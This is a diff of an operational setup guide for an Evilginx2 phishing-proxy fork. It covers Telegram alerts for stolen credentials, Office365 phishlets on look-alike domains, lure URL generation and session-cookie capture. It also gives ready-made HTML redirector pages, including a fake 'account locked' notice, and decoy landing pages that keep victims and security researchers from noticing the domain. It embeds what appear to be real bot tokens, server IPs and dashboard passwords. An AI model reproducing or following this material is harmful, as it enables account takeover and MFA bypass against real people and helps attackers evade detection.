-If you can't find your chat ID in the JSON, message [@userinfobot](https://t.me/userinfobot) on Telegram. It will reply with your user ID (which is the same as your chat ID for private chats).
-
----
-
-### 8.4 — Test the Bot (Send a Test Message)
+Test that everything works by sending yourself a message:
 
 ```bash
-curl -s "https://api.telegram.org/botYOUR_BOT_TOKEN/sendMessage?chat_id=YOUR_CHAT_ID&text=Hello+from+Evilginx"
+curl -s "https://api.telegram.org/bot8863425004:AAF7mZ0poUo6dal8-8FgUNgRkIhkPlylAvo/sendMessage?chat_id=7545456339&text=Hello%20from%20Evilginx%20-%20test%20message"
 ```
 
-**Replace `YOUR_BOT_TOKEN` and `YOUR_CHAT_ID` with your actual values.**
+Replace token and chat ID with YOUR values.
 
-**Expected result:** Within 2-3 seconds, you should see the message "Hello from Evilginx" in your Telegram chat with the bot.
+✅ **Expected:** You receive the message in Telegram on your phone/computer.
+
+Also expected response:
+```json
+{"ok":true,"result":{"message_id":2,"from":{"id":8863425004,"is_bot":true,"first_name":"MyAlertBot","username":"my_alert_bot"},"chat":{"id":7545456339,"first_name":"YourName","type":"private"},"date":1692000100,"text":"Hello from Evilginx - test message"}}
+```
 
 ---
 
-### 8.5 — Start Evilginx and Configure Telegram
+# PART 10: CONFIGURE TELEGRAM IN EVILGINX
 
-Start Evilginx:
+## STEP 37 — Start Evilginx and Configure Telegram
 
 ```bash
 cd /root/evilginx2
-./evilginx2 -dashboard 0.0.0.0:5000 -dashboard-user admin -dashboard-pass 'YourStrongPassword123!' -feed
+./evilginx2 -dashboard 0.0.0.0:5000 -dashboard-user admin -dashboard-pass mypass123
 ```
 
 Wait for the `evilginx>` prompt.
 
-Now configure Telegram:
+At the prompt:
 
 ```
-config teletoken YOUR_BOT_TOKEN
-config chatid YOUR_CHAT_ID
+config teletoken 8863425004:AAF7mZ0poUo6dal8-8FgUNgRkIhkPlylAvo
 ```
 
-**Replace with your actual values.** Example:
+✅ **Expected:**
 ```
-config teletoken 7123456789:AAF7mZ0poUo6dal8-8FgUNgRkIhkPlylAvo
+[inf] Telegram Bot Token set to: 8863425004:AAF7mZ0poUo6dal8-8FgUNgRkIhkPlylAvo
+```
+
+```
 config chatid 7545456339
 ```
 
-**Expected output:**
+✅ **Expected:**
 ```
-[inf] Telegram bot token set to: 7123456789:AAF7mZ0poUo6dal8-8FgUNgRkIhkPlylAvo
-[inf] Telegram chat ID set to: 7545456339
-```
-
----
-
-### 8.6 — Enable Telegram Notifications
-
-```
-config telegram_enabled on
+[inf] Telegram Chat ID set to: 7545456339
 ```
 
-**Expected output:**
-```
-[inf] Telegram notifications enabled
-```
-
----
-
-### 8.7 — Test the Integration
+## STEP 38 — Test Telegram
 
 ```
 test telegram
 ```
 
-**Expected result:** Within 2-3 seconds, you receive a Telegram message like:
-
+✅ **Expected:**
 ```
-🤖 Evilginx Telegram Test
-
-✅ Telegram integration is working correctly.
+[inf] Telegram test message sent successfully!
 ```
 
-> **If you don't get the message:**
-> 1. Re-verify the token: `curl -s "https://api.telegram.org/botYOUR_BOT_TOKEN/getMe"`
-> 2. Re-verify the chat ID: `curl -s "https://api.telegram.org/botYOUR_BOT_TOKEN/getUpdates"`
-> 3. Make sure you typed the values correctly (no extra spaces, correct case)
+✅ **Also:** You should receive a test message in Telegram on your phone.
 
----
-
-### 8.8 — Save and Exit
+## STEP 39 — Exit to Save
 
 ```
 exit
 ```
 
-✅ **Telegram is working. Move to Phase 9.**
+The Telegram settings are now saved in your config file.
 
 ---
 
-## PHASE 9 — Create Your First Phishing Campaign
+# PART 11: GEOIP DATABASE SETUP
 
-**Time: ~15 minutes | Where: Evilginx console**
+The GeoIP database tells you the country, city, and VPN status of every visitor. Without it, you'll just see an IP address. With it, you'll see "Vistor is from New York, USA — using a VPN."
 
-### 🎯 Goal: Enable a phishlet (website template), generate a phishing URL, and capture a test session
+## STEP 40 — Download GeoLite2 Databases
 
----
+Create the directory and download the databases:
 
-### 9.1 — List Available Phishlets
-
-At the `evilginx>` prompt (start Evilginx if not already running):
-
-```
-phishlets
+```bash
+mkdir -p /root/.evilginx/GeoIP
+cd /root/.evilginx/GeoIP
 ```
 
-**Expected output:**
-```
-           phishlet      status   hostname
-─────────────────────────────────────────
-            office365    disabled
-              google     disabled
-             linkedin    disabled
-            facebook     disabled
-            instagram    disabled
-              twitter    disabled
-            github       disabled
-        (and 30+ more...)
+**Download the City database** (tells you country and city):
+
+```bash
+# Try direct download first (no account needed)
+wget -O GeoLite2-City.mmdb.gz "https://github.com/P3TERX/GeoLite.mmdb/raw/main/GeoLite2-City.mmdb" 2>/dev/null || \
+curl -L -o GeoLite2-City.mmdb "https://github.com/P3TERX/GeoLite.mmdb/raw/main/GeoLite2-City.mmdb"
 ```
 
-These are YAML template files in the `phishlets/` directory. Each one knows how to copy a specific website.
+**Download the ASN database** (tells you ISP and VPN detection):
 
----
-
-### 9.2 — Find the Phishlet You Want
-
-Common phishlets available in this fork:
-
-| Phishlet | Targets | Difficulty | Captures |
-|:---------|:--------|:-----------|:---------|
-| `office365` | Microsoft 365, Outlook, OneDrive | Easy | Email, password, 2FA cookies |
-| `microsoft` | Microsoft Account (personal) | Easy | Email, password, 2FA cookies |
-| `google` | Gmail, Google Workspace | Medium | Email, password, session cookies |
-| `linkedin` | LinkedIn | Easy | Email, password |
-| `facebook` | Facebook | Medium | Email, password, session cookies |
-| `instagram` | Instagram | Medium | Username, password |
-| `github` | GitHub | Easy | Email, password, 2FA tokens |
-| `twitter` | Twitter/X | Medium | Username, password |
-| `protonmail` | ProtonMail | Hard | Email, password |
-| `outlook` | Outlook.com | Easy | Email, password, cookies |
-
-For this guide, I'll use `office365` as the example. Replace with your target.
-
----
-
-### 9.3 — Set Hostname for the Phishlet
-
-```
-phishlets hostname office365 YOUR_DOMAIN
+```bash
+wget -O GeoLite2-ASN.mmdb "https://github.com/P3TERX/GeoLite.mmdb/raw/main/GeoLite2-ASN.mmdb" 2>/dev/null || \
+curl -L -o GeoLite2-ASN.mmdb "https://github.com/P3TERX/GeoLite.mmdb/raw/main/GeoLite2-ASN.mmdb"
 ```
 
-**Example:**
-```
-phishlets hostname office365 offices65.online
+Check the files:
+
+```bash
+ls -lh /root/.evilginx/GeoIP/
 ```
 
-**Expected output:**
+✅ **Expected:**
 ```
-[inf] set hostname for 'office365' to: offices65.online
+total 45000
+-rw-r--r-- 1 root root 30M Aug 25 12:00 GeoLite2-ASN.mmdb
+-rw-r--r-- 1 root root 15M Aug 25 12:00 GeoLite2-City.mmdb
+```
+
+**If the files are only a few KB:** The download probably returned an HTML page (rate limited). Try again later or download manually to your computer and upload via SCP:
+
+```bash
+# On your local computer, not the VPS:
+scp ~/Downloads/GeoLite2-City.mmdb root@95.133.228.19:/root/.evilginx/GeoIP/
+scp ~/Downloads/GeoLite2-ASN.mmdb root@95.133.228.19:/root/.evilginx/GeoIP/
 ```
 
 ---
 
-### 9.4 — Enable the Phishlet
+# PART 12: START EVILGINX WITH FULL FEATURES
+
+## STEP 41 — Start Evilginx with All Options
+
+```bash
+cd /root/evilginx2
+./evilginx2 \
+  -dashboard 0.0.0.0:5000 \
+  -dashboard-user admin \
+  -dashboard-pass mypass123 \
+  -geoip-db /root/.evilginx/GeoIP
+```
+
+Let's break down what each flag does:
+
+| Flag | What It Does |
+|------|--------------|
+| `-dashboard 0.0.0.0:5000` | Starts the web dashboard on all IPs at port 5000 |
+| `-dashboard-user admin` | Dashboard login username |
+| `-dashboard-pass mypass123` | Dashboard login password |
+| `-geoip-db /root/.evilginx/GeoIP` | Tells Evilginx where to find the GeoIP databases |
+
+## STEP 42 — Verify Wildcard Certificate Loads
+
+As Evilginx starts, look for these lines in the output:
+
+```
+[inf] loading GeoIP database from: /root/.evilginx/GeoIP
+[inf] geoip: loaded GeoIP database from /root/.evilginx/GeoIP/GeoLite2-City.mmdb
+[inf] geoip: GeoIP initialized — country tracking active
+```
+
+**AND MOST IMPORTANTLY:**
+```
+[wld] using wildcard certificate for: *.officialmonsterz.store
+[inf] wildcard certificate loaded..
+```
+
+✅ **If you see both of these — CONGRATULATIONS! The wildcard cert is working!**
+
+**If you DON'T see the wildcard messages** and instead see:
+```
+[war] individual subdomains WILL appear in Certificate Transparency (crt.sh)
+```
+
+Then run through this checklist:
+
+### Troubleshooting Wildcard Certificate Not Loading
+
+```
+Check 1: Do the files exist?
+ls -la /root/.evilginx/crt/wildcard/
+```
+Both `fullchain.pem` and `privkey.pem` must exist.
+
+```
+Check 2: Is the domain set correctly in config?
+cat /root/.evilginx/config.json | grep domain
+```
+Must show your domain name.
+
+```
+Check 3: Is the certificate actually for *.yourdomain.com?
+openssl x509 -in /root/.evilginx/crt/wildcard/fullchain.pem -noout -subject
+```
+Must show `subject = CN = *.officialmonsterz.store`
+
+```
+Check 4: Restart Evilginx cleanly
+```
+Type `exit` at evilginx prompt, then run the start command again.
+
+```
+Check 5: Is autocert enabled?
+```
+At the evilginx prompt, run `config`. If autocert is `false`, run `config autocert on` and restart.
+
+---
+
+# PART 13: SET UP A PHISHLET AND GET YOUR PHISHING URL
+
+## STEP 43 — Set Up Office365 Phishlet
+
+At the `evilginx>` prompt:
+
+```
+phishlets hostname office365 officialmonsterz.store
+```
+
+✅ **Expected:**
+```
+[inf] phishlet 'office365' hostname set to: officialmonsterz.store
+```
+
+This tells Evilginx: "When someone visits any subdomain of officialmonsterz.store, use the Office365 phishlet to handle the request."
 
 ```
 phishlets enable office365
 ```
 
-**Wait 30-60 seconds.** Evilginx will:
-1. Generate a random subdomain (e.g., `login-xyz.offices65.online`)
-2. Use the wildcard SSL cert to enable HTTPS
-3. Set up the reverse proxy
-4. Configure token capture
-
-**Expected output:**
+✅ **Expected:**
 ```
-[inf] phishlet 'office365' is now enabled
+[inf] enabled phishlet 'office365'
 ```
 
-> **If you see certificate errors:** Make sure your wildcard cert is at `/root/.evilginx/wildcard/` (Phase 7).
+This activates the phishlet so it actually serves the fake login page.
 
----
-
-### 9.5 — Verify the Phishlet is Enabled
-
-```
-phishlets
-```
-
-**Expected output:**
-```
-           phishlet      status   hostname
-─────────────────────────────────────────
-            office365    enabled  offices65.online
-```
-
-The `status` column should say `enabled`.
-
----
-
-### 9.6 — Create a Lure (Phishing URL)
+## STEP 44 — Create a Lure and Get the URL
 
 ```
 lures create office365
 ```
 
-**What's a lure?** A lure is a specific phishing URL. You can create multiple lures for the same phishlet (with different paths/hostnames) to track different campaigns.
-
-**Expected output:**
+✅ **Expected:**
 ```
-[inf] created lure with ID: 0
+[inf] lure '0' created for phishlet 'office365'
 ```
 
----
-
-### 9.7 — Get Your Phishing URL
+A "lure" is a specific phishing URL. Each lure has a unique path so you can track different campaigns.
 
 ```
 lures get-url 0
 ```
 
-**Expected output:**
+✅ **Expected:**
 ```
-https://login-abc123def456.offices65.online/aBcDeFgHiJ
+[0] https://login.officialmonsterz.store/a8f3k2m1
 ```
 
-> **📝 COPY THIS URL.** This is the URL you'll send to your target.
+The `0` means "lure number 0" (the first one). Your URL will look different (random path).
+
+**This URL is your phishing link.** When someone visits it, they'll see a Microsoft 365 login page. When they enter their credentials, Evilginx captures them and forwards them to the real Microsoft.
+
+## STEP 45 — Verify the Phishing Page Works
+
+Still at the `evilginx>` prompt, open a browser on your computer and visit the phishing URL:
+
+```
+https://login.officialmonsterz.store/a8f3k2m1
+```
+
+✅ **You should see:** A Microsoft 365 login page that looks exactly real.
+
+⚠️ **If you see a "Not Secure" warning:** The wildcard cert isn't loading correctly. Go back to Step 42 troubleshooting.
+
+⚠️ **If you see "Connection refused":** UFW might not allow port 443. Check: `ufw status | grep 443`
+
+⚠️ **If the page is blank:** Check the Evilginx logs in the terminal for errors.
 
 ---
 
-### 9.8 — Test the URL in a Private Browser Window
+# PART 14: WEB DASHBOARD
 
-1. Open a **new incognito/private browsing window** in your browser
-2. Paste the phishing URL
-3. Press **Enter**
+## STEP 46 — Access the Dashboard
 
-**Expected result:** A perfect replica of the Microsoft Office 365 login page loads.
-
-> **If you see a blank page:** Wait 30 seconds (DNS cache, SSL handshake), then refresh.
-> 
-> **If you see a Cloudflare error:** Your A record is still proxied (orange cloud). Go to Cloudflare and turn it grey.
-> 
-> **If you see a certificate warning:** Your wildcard cert is misconfigured. Redo Phase 7.
-
----
-
-### 9.9 — Test the Full Capture
-
-1. On the fake Microsoft login page, type a **fake username** (e.g., `test@yourdomain.com`)
-2. Type a **fake password** (e.g., `MyTestPassword123`)
-3. Click **"Sign In"** (or "Next")
-4. The page will redirect to your `unauth_url` (Google, from Phase 6)
-5. **Check your Telegram** — within 5 seconds, you should receive a notification like:
+Open your browser and go to:
 
 ```
-🔴 New Evilginx Session Captured!
-
-📧 Username: test@yourdomain.com
-🔑 Password: MyTestPassword123
-🌐 Site: office365
-📍 IP: 192.168.1.100
-🕐 Time: 2026-07-13 01:30:45
-🖥️ User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)...
+http://95.133.228.19:5000
 ```
 
-If you see this, **everything is working perfectly**.
+**Login:** `admin`
+**Password:** `mypass123`
 
----
+✅ **What you'll see:** The Evilginx2 Dashboard with:
+- **Total Sessions** counter
+- **Unique Phishlets** counter  
+- **Search bar** — search by username, password, phishlet, IP
+- **Phishlet filter dropdown** — show only specific phishlets
+- **Export CSV / Export JSON buttons** — download all captured data
+- **Refresh button** — manually refresh the session list
+- **Dark Mode toggle** — switch between light and dark themes
+- **Table columns:** ID, Phishlet, Username, Password, IP Address, Tokens, Created, Actions (Delete)
+- **Pagination:** Navigate through pages of sessions
+- **Auto-refresh:** Dashboard auto-refreshes every 5 seconds
 
-### 9.10 — View Captured Sessions in Evilginx
+✅ **Click on any row** to see the full session details including cookies, body tokens, HTTP tokens, and GeoIP data.
 
-At the `evilginx>` prompt:
-
-```
-sessions
-```
-
-**Expected output:**
-```
-   id    phishlet     username              password              tokens   remote ip        time
-─────────────────────────────────────────────────────────────────────────────────────────────────
-    0    office365     test@yourdomain.com   MyTestPassword123     0         192.168.1.100    00:30:45
-```
-
-To see full details (including captured cookies):
-
-```
-sessions 0
-```
-
-This shows you the full session, including the **session cookies** you can import into a browser.
-
-✅ **Phishing campaign is working. Move to Phase 9B to set up redirectors.**
-
----
-
-## PHASE 9B — Custom Redirectors (Post-Auth HTML Pages)
-
-**Time: ~15 minutes | Where: Server terminal + HTML editor**
-
-### 🎯 Goal: Create custom HTML pages that victims see AFTER they enter their credentials — instead of immediately redirecting to Google
-
-**Why this matters:** 
-- When a victim logs in and immediately gets redirected to Google, they know something is wrong
-- A well-crafted "redirector" page makes the experience feel natural
-- Examples: "Checking your account...", "Please wait while we redirect you to your dashboard..."
-- This buys you time — the victim doesn't immediately realize they've been phished
-
----
-
-### 9B.1 — Understanding Redirectors
-
-A redirector is an HTML file that Evilginx serves AFTER the victim logs in. It can:
-- Show a "loading" animation
-- Display a fake "account locked" message (to get them to enter even more info)
-- Redirect to the real website (best for stealth — victim doesn't notice)
-- Show a decoy page (e.g., "Your email client is being configured")
-
----
-
-### 9B.2 — Create a Simple "Redirecting" Redirector
+⚠️ **Security note:** The dashboard is on HTTP (not HTTPS). For secure remote access, use SSH tunneling:
 
 ```bash
-mkdir -p /root/evilginx2/redirectors
-nano /root/evilginx2/redirectors/redirecting.html
+# On your local computer (not the VPS):
+ssh -L 5000:localhost:5000 root@95.133.228.19
 ```
 
-Paste this HTML:
-
-```html
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Redirecting...</title>
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { 
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background: #f0f2f5;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            color: #333;
-        }
-        .container {
-            text-align: center;
-            background: white;
-            padding: 40px 60px;
-            border-radius: 8px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-            max-width: 500px;
-        }
-        .spinner {
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid #0078d4;
-            border-radius: 50%;
-            width: 50px;
-            height: 50px;
-            animation: spin 1s linear infinite;
-            margin: 0 auto 20px auto;
-        }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        h2 { margin-bottom: 10px; font-weight: 500; }
-        p { color: #666; font-size: 14px; line-height: 1.5; }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <div class="spinner"></div>
-        <h2>Signing you in...</h2>
-        <p>Please wait while we redirect you to your account dashboard.<br>
-        This should only take a moment.</p>
-    </div>
-    <script>
-        // Automatically redirect to the real site after 2-3 seconds
-        setTimeout(function() {
-            window.location.href = 'https://www.office.com';
-        }, 2500);
-    </script>
-</body>
-</html>
-```
-
-Save and exit (`Ctrl + O`, `Enter`, `Ctrl + X`).
-
-**What this does:** Shows a convincing "Signing you in..." loading page for 2.5 seconds, then automatically redirects to the real Office 365 dashboard. The victim thinks: "Oh, the login worked, I'm being redirected. Must be a slow connection."
+Then visit `http://localhost:5000` in your browser. This encrypts the traffic through your SSH connection.
 
 ---
 
-### 9B.3 — Create a Fake "Account Locked" Redirector
+# PART 15: AUTO-START ON BOOT (SYSTEMD SERVICE)
 
-This redirector is aggressive — it tells the victim their account was locked and asks them to call a fake support number. This buys you even more time.
+If your VPS reboots, you want Evilginx to start automatically. We create a "systemd service" to do this.
 
-```bash
-nano /root/evilginx2/redirectors/account_locked.html
-```
-
-Paste:
-
-```html
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Account Temporarily Locked</title>
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { 
-            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-        }
-        .card {
-            background: white;
-            padding: 40px;
-            border-radius: 12px;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
-            max-width: 480px;
-            width: 90%;
-        }
-        .icon { 
-            font-size: 48px; 
-            text-align: center; 
-            margin-bottom: 16px;
-        }
-        h1 { 
-            font-size: 22px; 
-            color: #d32f2f; 
-            text-align: center; 
-            margin-bottom: 8px;
-        }
-        .subtitle { 
-            text-align: center; 
-            color: #666; 
-            margin-bottom: 24px;
-            font-size: 14px;
-        }
-        .info { 
-            background: #fff3e0; 
-            padding: 16px;
-            border-radius: 8px;
-            margin-bottom: 20px;
-            font-size: 14px;
-            line-height: 1.6;
-            border-left: 4px solid #ff9800;
-        }
-        .info strong { display: block; margin-bottom: 4px; color: #e65100; }
-        .btn {
-            display: block;
-            width: 100%;
-            padding: 14px;
-            background: #0078d4;
-            color: white;
-            border: none;
-            border-radius: 6px;
-            font-size: 16px;
-            cursor: pointer;
-            text-decoration: none;
-            text-align: center;
-            transition: background 0.2s;
-        }
-        .btn:hover { background: #106ebe; }
-        .footer {
-            text-align: center;
-            margin-top: 16px;
-            font-size: 12px;
-            color: #999;
-        }
-    </style>
-</head>
-<body>
-    <div class="card">
-        <div class="icon">🔒</div>
-        <h1>Account Temporarily Locked</h1>
-        <p class="subtitle">We detected unusual sign-in activity on your account.</p>
-        <div class="info">
-            <strong>⚠️ Security Notice</strong>
-            Your account has been temporarily suspended due to multiple failed login attempts from an unrecognized device. To protect your data, access has been restricted.
-        </div>
-        <p style="font-size:14px; margin-bottom:16px; color:#555; text-align:center;">
-            Please contact your IT administrator to restore access.
-        </p>
-        <a href="https://support.microsoft.com" class="btn">Learn More</a>
-        <div class="footer">
-            Microsoft Corporation · One Microsoft Way · Redmond, WA 98052
-        </div>
-    </div>
-</body>
-</html>
-```
-
-Save and exit.
-
----
-
-### 9B.4 — Create a Bounce Redirector (Redirects to Real Site)
-
-This is the most stealthy option — the victim completes login and simply ends up on the real website.
-
-```bash
-nano /root/evilginx2/redirectors/bounce.html
-```
-
-Paste:
-
-```html
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta http-equiv="refresh" content="0;url=https://www.office.com">
-    <title>Redirecting</title>
-</head>
-<body>
-    <p>Please wait while we redirect you...</p>
-    <script>
-        window.location.replace("https://www.office.com");
-    </script>
-</body>
-</html>
-```
-
-Save and exit.
-
----
-
-### 9B.5 — Configure Evilginx to Use a Redirector
-
-In the Evilginx console:
-
-```
-config redirect_key r
-config redirect_url https://YOUR_DOMAIN/redirectors/bounce.html
-```
-
-Or, if you want to use the "redirecting" page:
-
-```
-config redirect_url https://YOUR_DOMAIN/redirectors/redirecting.html
-```
-
-**How this works:** After a victim logs in, Evilginx appends `?r=1` to the redirect URL. The redirector page is served from your server. The victim sees your redirector HTML instead of immediately jumping to Google.
-
----
-
-### 9B.6 — Test Your Redirector
-
-1. Start Evilginx
-2. Enable a phishlet, create a lure, get the URL
-3. Log in with fake credentials
-4. **Expected:** You should see your redirector page (e.g., the loading spinner) for 2-3 seconds, then be redirected to the real site
-
-> **If you don't see the redirector:** 
-> - Check that `config redirect_key r` is set
-> - Check the redirector file exists and has no errors
-> - Check Evilginx logs for errors
-
-✅ **Redirectors are set up. Move to Phase 9C for custom landing pages.**
-
----
-
-## PHASE 9C — Custom Landing Pages
-
-**Time: ~15 minutes | Where: Server terminal + HTML editor**
-
-### 🎯 Goal: Create fake landing pages for bots and scanners who visit your domain directly (instead of via the lure URL)
-
-**Why this matters:** 
-- If a security researcher types `offices65.online` into their browser, they see... your Evilginx dashboard? Google? That's suspicious.
-- A custom landing page makes your domain look like a legitimate business, SaaS product, or URL shortener
-- This reduces the chance of your domain being reported or blocklisted
-
----
-
-### 9C.1 — Create a Fake Business Landing Page
-
-Let's create a landing page that looks like a legitimate URL shortener / link management service:
-
-```bash
-mkdir -p /root/evilginx2/landing
-nano /root/evilginx2/landing/index.html
-```
-
-Paste this:
-
-```html
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>LinkFlow — Smart Link Management</title>
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background: #ffffff;
-            color: #333;
-            line-height: 1.6;
-        }
-        .header {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            color: white;
-            padding: 60px 20px;
-            text-align: center;
-        }
-        .header h1 { font-size: 42px; margin-bottom: 16px; font-weight: 700; }
-        .header p { font-size: 18px; opacity: 0.9; max-width: 600px; margin: 0 auto; }
-        .container { max-width: 900px; margin: 0 auto; padding: 60px 20px; }
-        .features { display: grid; grid-template-columns: repeat(3, 1fr); gap: 30px; margin-bottom: 60px; }
-        .feature { padding: 24px; border-radius: 8px; border: 1px solid #e0e0e0; }
-        .feature h3 { margin-bottom: 8px; font-size: 18px; }
-        .feature p { font-size: 14px; color: #666; }
-        .footer {
-            border-top: 1px solid #e0e0e0;
-            padding: 20px;
-            text-align: center;
-            color: #999;
-            font-size: 13px;
-        }
-        @media (max-width: 768px) { .features { grid-template-columns: 1fr; } }
-    </style>
-</head>
-<body>
-    <div class="header">
-        <h1>LinkFlow</h1>
-        <p>Enterprise link management and analytics platform.<br>Trusted by 10,000+ businesses worldwide.</p>
-    </div>
-    <div class="container">
-        <div class="features">
-            <div class="feature">
-                <h3>Link Shortening</h3>
-                <p>Create branded short links that drive engagement and build trust with your audience.</p>
-            </div>
-            <div class="feature">
-                <h3>Real-Time Analytics</h3>
-                <p>Track clicks, geographic data, device types, and referral sources in real-time.</p>
-            </div>
-            <div class="feature">
-                <h3>QR Codes</h3>
-                <p>Generate dynamic QR codes for your links with custom designs and colors.</p>
-            </div>
-        </div>
-        <div style="text-align:center;">
-            <p style="color:#999; margin-bottom:20px;">LinkFlow is currently in private beta.</p>
-            <a href="#" style="display:inline-block; padding:14px 32px; background:#667eea; color:white; text-decoration:none; border-radius:6px; font-weight:600;">Join Waitlist</a>
-        </div>
-    </div>
-    <div class="footer">
-        &copy; 2026 LinkFlow Technologies, Inc. All rights reserved.
-    </div>
-</body>
-</html>
-```
-
-Save and exit.
-
----
-
-### 9C.2 — Create a "Coming Soon" Page (Alternative)
-
-If you want something even simpler:
-
-```bash
-nano /root/evilginx2/landing/coming_soon.html
-```
-
-Paste:
-
-```html
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Coming Soon</title>
-    <style>
-        body { 
-            font-family: -apple-system, sans-serif; 
-            background: #f5f5f5; 
-            display: flex; 
-            justify-content: center; 
-            align-items: center; 
-            height: 100vh; 
-            margin: 0; 
-        }
-        .box { 
-            text-align: center; 
-            background: white; 
-            padding: 60px; 
-            border-radius: 12px; 
-            box-shadow: 0 2px 20px rgba(0,0,0,0.08); 
-        }
-        h1 { font-size: 32px; color: #333; margin-bottom: 8px; }
-        p { color: #888; font-size: 16px; }
-        .dot { display: inline-block; width: 8px; height: 8px; background: #667eea; border-radius: 50%; margin: 0 3px; animation: bounce 1s infinite; }
-        .dot:nth-child(2) { animation-delay: 0.2s; }
-        .dot:nth-child(3) { animation-delay: 0.4s; }
-        @keyframes bounce { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-10px); } }
-    </style>
-</head>
-<body>
-    <div class="box">
-        <div style="margin-bottom: 20px;">
-            <span class="dot"></span>
-            <span class="dot"></span>
-            <span class="dot"></span>
-        </div>
-        <h1>Something great is coming</h1>
-        <p>We're working hard to launch our new platform. Stay tuned!</p>
-    </div>
-</body>
-</html>
-```
-
-Save and exit.
-
----
-
-### 9C.3 — Configure Evilginx to Serve the Landing Page
-
-In the Evilginx console:
-
-```
-config unauth_url file:///root/evilginx2/landing/index.html
-```
-
-Or for the "Coming Soon" page:
-
-```
-config unauth_url file:///root/evilginx2/landing/coming_soon.html
-```
-
-> **⚠️ Note:** The `file:///` prefix tells Evilginx to serve this as a local HTML file, not redirect to an external URL.
-
----
-
-### 9C.4 — Test the Landing Page
-
-1. Open a browser and go to: `https://YOUR_DOMAIN`
-2. **Expected:** You see your landing page (LinkFlow OR Coming Soon), not a redirect to Google
-
-3. Open a browser and go to: `https://YOUR_DOMAIN/[lure_path]`
-4. **Expected:** You see the phishing page (Office 365, Google, etc.)
-
-> **The `unauth_url` only shows for non-lure requests.** Your actual phishing URLs still work.
-
----
-
-### 9C.5 — Create a Custom 404 Page (Optional)
-
-If someone visits a non-existent path:
-
-```bash
-nano /root/evilginx2/landing/404.html
-```
-
-Paste:
-
-```html
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <title>404 - Page Not Found</title>
-    <style>
-        body { font-family: -apple-system, sans-serif; background: #f5f5f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .box { text-align: center; }
-        h1 { font-size: 72px; color: #ddd; margin: 0; }
-        p { color: #888; }
-    </style>
-</head>
-<body>
-    <div class="box">
-        <h1>404</h1>
-        <p>The page you're looking for doesn't exist.</p>
-    </div>
-</body>
-</html>
-```
-
-Save and exit.
-
-Evilginx should automatically serve this for invalid paths if configured. If not, set it:
-
-```
-config unauth_url file:///root/evilginx2/landing/404.html
-```
-
-✅ **Landing pages are set up. Move to Phase 10.**
-
----
-
-## PHASE 10 — The Web Dashboard
-
-**Time: ~10 minutes | Where: Web browser**
-
-### 🎯 Goal: Control Evilginx from a beautiful web interface (instead of typing commands)
-
----
-
-### 10.1 — Access the Dashboard
-
-1. Open a web browser on your computer
-2. Go to: `http://YOUR_SERVER_IP:5000`
-3. **Example:** `http://95.133.228.114:5000`
-4. You'll see a login page
-5. Enter:
-   - **Username:** `admin` (or whatever you set in Phase 6)
-   - **Password:** `YourStrongPassword123!` (or whatever you set)
-6. Click **"Login"**
-
-**Expected result:** You see the Evilginx Dashboard with:
-- Active phishlets
-- Lure list
-- Session list
-- Configuration panel
-- Real-time stats
-
----
-
-### 10.2 — Dashboard Features Overview
-
-The dashboard has these sections (in the sidebar):
-
-| Section | What It Does |
-|:--------|:-------------|
-| **Dashboard** | Overview of active campaigns, session counts, recent activity |
-| **Phishlets** | Enable/disable phishlets, set hostnames, view status |
-| **Lures** | Create, edit, delete lures; get phishing URLs |
-| **Sessions** | View all captured sessions, search, filter, export |
-| **Telegram** | Configure bot token and chat ID, test integration |
-| **Settings** | Change domain, IP, ports, all other configurations |
-| **Users** | (If multi-user enabled) Manage team members |
-| **Audit Log** | View all administrative actions |
-
----
-
-### 10.3 — Enable HTTPS for the Dashboard (Recommended)
-
-By default, the dashboard runs on HTTP (port 5000). For better security, enable HTTPS:
-
-#### Option A: Use a Reverse Proxy (Recommended)
-
-Install nginx:
-
-```bash
-apt install -y nginx
-```
-
-Create a config file:
-
-```bash
-nano /etc/nginx/sites-available/evilginx-dashboard
-```
-
-Paste this content:
-
-```nginx
-server {
-    listen 8443 ssl;
-    server_name _;
-    
-    ssl_certificate /root/.evilginx/wildcard/fullchain.pem;
-    ssl_certificate_key /root/.evilginx/wildcard/privkey.pem;
-    
-    location / {
-        proxy_pass http://127.0.0.1:5000;
-        proxy_set_header Host $host;
-        proxy_set_header X-Real-IP $remote_addr;
-        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
-        proxy_set_header X-Forwarded-Proto $scheme;
-        proxy_http_version 1.1;
-        proxy_set_header Upgrade $http_upgrade;
-        proxy_set_header Connection "upgrade";
-    }
-}
-```
-
-Save and exit (`Ctrl + O`, `Enter`, `Ctrl + X`).
-
